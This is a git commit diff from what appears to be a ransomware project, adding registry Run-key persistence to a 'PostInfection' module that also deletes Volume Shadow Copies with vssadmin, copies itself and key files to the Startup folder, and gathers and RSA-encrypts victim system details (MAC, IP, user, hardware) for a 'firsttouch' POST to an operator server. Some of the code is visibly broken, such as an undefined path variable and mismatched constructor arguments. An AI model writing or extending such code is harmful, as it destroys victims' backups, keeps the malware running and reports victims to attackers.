eb08ff5bef03811f9f6608d4c9fc16b2cec99b08
HaaaToka <okanalan97.14@gmail.com>
2020-12-19 10:04:28 -0500

    PostInfection :: add regedit key

--- offlineMode.py
+++ offlineMode.py
@@ -4,4 +4,4 @@ from postInfection import PostInfection
 
 starter.keyStoreCreate(utils.version, utils.what_is_my_id)
 starter.startContagion(utils.root_directory, utils.rsa_public_key)
-PostInfection("offline").firstWork()
+PostInfection("offline", utils.what_is_my_id , utils.when_did_i_work, utils.rsa_public_key).firstWork()
--- postInfection.py
+++ postInfection.py
@@ -1,14 +1,19 @@
 import os
 import sys
 import ctypes
+import base64
 from shutil import copyfile
 
 from utils import resourcePath, aesIV_file_store_path
+from hasp.RSACipher import RSACipher
 class PostInfection(object):
 
-    def __init__(self, mode):
+    def __init__(self, id, mode, infection_date, rsa_pub_key):
         print("PostInfection Object Created")
+        self.victim_id = id
         self.mode = mode
+        self.infection_date = infection_date
+        self.rsa_pub_key = rsa_pub_key
         self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
         print("Wallpaper :", self.wallpaper_path)
 
@@ -22,7 +27,24 @@ class PostInfection(object):
 
     def deleteShadowFiles(self):
         os.system('vssadmin.exe delete shadows /all /quiet')
-    
+
+    def addToRegistry(self,var_name,value):
+        
+        # key we want to change is HKEY_CURRENT_USER  
+        # key value is Software\Microsoft\Windows\CurrentVersion\Run 
+        KEY = "Software\Microsoft\Windows\CurrentVersion\Run"
+        
+        # open the key to make changes to 
+        openkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,KEY,0,winreg.KEY_ALL_ACCESS) 
+        
+        # modifiy the opened key 
+        winreg.SetValueEx(openkey,var_name,0,winreg.REG_SZ,value) 
+        
+        # now close the opened key 
+        winreg.CloseKey(openkey) 
+
+        # AddToRegistry("D:\\templateCoding\\abc.txt")
+
     def setItselfStartUpApplication(self):
         """
             create autorun program to display a warning message each time a computer is turned on
@@ -31,7 +53,8 @@ class PostInfection(object):
         # TODO: try-except for KeyError
         # get startup location
         try:
-            _startup_location = os.environ["USERPROFILE"]+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+            _user_profile = os.environ["USERPROFILE"]
+            _startup_location = _user_profile + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
             #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
         except:
             _startup_location = "/home/kali/Desktop/Startup"
@@ -49,8 +72,23 @@ class PostInfection(object):
         _startup_key_file_path = os.path.join(_startup_location,os.path.basename(aesIV_file_store_path))
         copyfile(aesIV_file_store_path, _startup_key_file_path)
 
+        
+        if _startup_location != "/home/kali/Desktop/Startup":
+            import winreg
+            _regedit_temp = _user_profile + "\\AppData\\Local"
+            # copy aes file for regedit
+            _regedit_key_file_path = os.path.join(_regedit_temp, os.path.basename(aesIV_file_store_path))
+            copyfile(aesIV_file_store_path,_regedit_key_file_path)
+            self.addToRegistry("aptaltxt", _regedit_key_file_path)
+            if self.mode == "online":
+                # copy gui file for regedit
+                _regedit_aptal_path = os.path.join(_regedit_temp, os.path.basename(sys.argv[0]))
+                copyfile(aptal_path, _regedit_aptal_path)
+                self.addToRegistry("aptalgui", _regedit_key_file_path)
+                
 
-    def getSystemInfo(self):
+
+    def collectFirstTouchInfos(self):
         import platform,socket,json,re,uuid,psutil
         try:
             info={}
@@ -63,6 +101,7 @@ class PostInfection(object):
             info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
             info['processor']=platform.processor()
             info['ram']=str(round(psutil.virtual_memory().total / (1024.0**3)))+" GB"
+            info['infection_date'] = self.infection_date
             return json.dumps(info)
         except Exception as e:
             return "Problem Has Been Occured When Information Gathering"
@@ -72,26 +111,30 @@ class PostInfection(object):
         # self.deleteShadowFiles()
         # self.changeWallpaper()
         self.setItselfStartUpApplication()
-        print(self.getSystemInfo())
+        infoself = self.collectFirstTouchInfos()
+
+        rsa_cipher = RSACipher(self.rsa_pub_key)
+        encrypted_system_info = base64.b64encode(rsa_cipher.encrypt(infoself.encode()))
+        # self.firstTouch(self.collectFirstTouchInfos())
 
 
-    def firstTouch(self,encryptedInformations):
+    def firstTouch(self, encryptedInformations):
         """
         POST /api/user/firsttouch
         system information encrypted with RSA public key of victim
             - id
+            - infection date
             - computer name
             - user name
             - infection date
             - ram
             - cpu
             - local ip
-            - 
         """
         from requests import post
 
         url = 'middleware/api/user/firsttouch'
-        data = {'info': encryptedInformations}
+        data = {'id':self.victim_id,'info': encryptedInformations}
 
         response = post(url, data = data)
 
